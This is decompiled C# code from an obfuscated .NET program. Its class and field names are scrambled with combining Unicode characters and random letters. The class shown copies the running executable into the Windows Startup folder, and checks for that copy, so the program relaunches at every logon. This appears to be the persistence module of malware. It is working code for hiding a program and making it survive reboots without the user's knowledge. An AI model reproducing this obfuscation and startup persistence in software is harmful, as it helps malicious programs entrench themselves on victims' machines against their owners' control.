using System;
using System.IO;
using System.Reflection;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000062 RID: 98
	internal static class Class_75
	{
		// Token: 0x060001CA RID: 458 RVA: 0x0000F652 File Offset: 0x0000D852
		public static bool is_installed()
		{
			return File.Exists(Class_75.\u0346\u0347\u033F\u0326\u0351\u0020\u0310\u0347\u0338\u0305\u035C\u033C\u0342\u036F\u032A\u0354clhzievwknqtlyav\u035E\u0312\u0352s\u0020\u0E47\u0345\u0323\u0316\u0304\u034B\u0324\u0314\u036F\u034B\u035Afatoesbbmsajmocq + "\\" + Class_84.\u034F\u0308\u0E47\u032C\u035E\u0358\u035C\u0020\u0020\u0E47\u0308\u0353\u0331\u0020\u0320\u033Fiwltmduetslrmowf\u032B\u0347\u0342e\u0347\u0342\u0351\u0320\u0358\u0E47\u035A\u0339\u0310\u033B\u0E47\u033Bkeeersuuafmousjv + ".exe");
		}

		// Token: 0x060001CB RID: 459 RVA: 0x0000F67E File Offset: 0x0000D87E
		public static void install()
		{
			File.Copy(Class_75.\u0020\u0339\u0E47\u0020\u0331\u0306\u0363\u0301\u0313\u0342\u0E47\u036F\u0356\u0351\u0324\u0367ftjstwztujtxtvaj\u0316\u034B\u0339\u0356\u0E47\u035A\u0367\u0306\u0348\u0020\u0020\u0331\u031A\u0316\u035C\u032Eopsmlarbetcxggfj, Class_75.\u0346\u0347\u033F\u0326\u0351\u0020\u0310\u0347\u0338\u0305\u035C\u033C\u0342\u036F\u032A\u0354clhzievwknqtlyav\u035E\u0312\u0352s\u0020\u0E47\u0345\u0323\u0316\u0304\u034B\u0324\u0314\u036F\u034B\u035Afatoesbbmsajmocq + "\\" + Class_84.\u034F\u0308\u0E47\u032C\u035E\u0358\u035C\u0020\u0020\u0E47\u0308\u0353\u0331\u0020\u0320\u033Fiwltmduetslrmowf\u032B\u0347\u0342e\u0347\u0342\u0351\u0320\u0358\u0E47\u035A\u0339\u0310\u033B\u0E47\u033Bkeeersuuafmousjv + ".exe", true);
		}

		// Token: 0x060001CC RID: 460 RVA: 0x0000F6B0 File Offset: 0x0000D8B0
		// Note: this type is marked as 'beforefieldinit'.
		static Class_75()
		{
			Assembly entryAssembly = Assembly.GetEntryAssembly();
			Class_75.\u0020\u0339\u0E47\u0020\u0331\u0306\u0363\u0301\u0313\u0342\u0E47\u036F\u0356\u0351\u0324\u0367ftjstwztujtxtvaj\u0316\u034B\u0339\u0356\u0E47\u035A\u0367\u0306\u0348\u0020\u0020\u0331\u031A\u0316\u035C\u032Eopsmlarbetcxggfj = ((entryAssembly != null) ? entryAssembly.Location : null);
		}

		// Token: 0x04000127 RID: 295
		private static string \u0346\u0347\u033F\u0326\u0351\u0020\u0310\u0347\u0338\u0305\u035C\u033C\u0342\u036F\u032A\u0354clhzievwknqtlyav\u035E\u0312\u0352s\u0020\u0E47\u0345\u0323\u0316\u0304\u034B\u0324\u0314\u036F\u034B\u035Afatoesbbmsajmocq = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

		// Token: 0x04000128 RID: 296
		public static string \u0020\u0339\u0E47\u0020\u0331\u0306\u0363\u0301\u0313\u0342\u0E47\u036F\u0356\u0351\u0324\u0367ftjstwztujtxtvaj\u0316\u034B\u0339\u0356\u0E47\u035A\u0367\u0306\u0348\u0020\u0020\u0331\u031A\u0316\u035C\u032Eopsmlarbetcxggfj;
	}
}
